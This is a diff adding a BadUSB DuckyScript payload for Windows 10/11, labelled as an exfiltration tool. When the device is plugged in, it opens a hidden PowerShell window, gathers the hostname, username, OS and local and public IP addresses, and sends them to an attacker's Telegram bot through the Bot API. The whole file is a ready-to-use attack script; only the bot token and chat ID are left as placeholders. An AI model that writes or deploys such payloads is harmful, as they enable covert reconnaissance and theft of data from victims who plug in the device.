@@ -1,0 +1,35 @@
+REM Author: UNC0V3R3D
+REM Description: Sends system info to a Telegram bot via the Bot API.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Windows 10/11
+REM Requirements: Internet connection, Telegram bot token and chat ID
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $token = 'TELEGRAM_BOT_TOKEN'
+ENTER
+DELAY 400
+STRING $chatId = 'TELEGRAM_CHAT_ID'
+ENTER
+STRING $hostname = $env:COMPUTERNAME
+ENTER
+STRING $user = $env:USERNAME
+ENTER
+STRING $os = (Get-WmiObject Win32_OperatingSystem).Caption
+ENTER
+STRING $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org' -EA SilentlyContinue)
+ENTER
+STRING $localip = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'} | Select-Object -First 1).IPAddress)
+ENTER
+STRING $msg = "*BadUSB Report*%0AHostname: $hostname%0AUser: $user%0AOS: $os%0ALocal IP: $localip%0APublic IP: $ip"
+ENTER
+STRING Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body "chat_id=$chatId&text=$msg&parse_mode=Markdown" | Out-Null
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
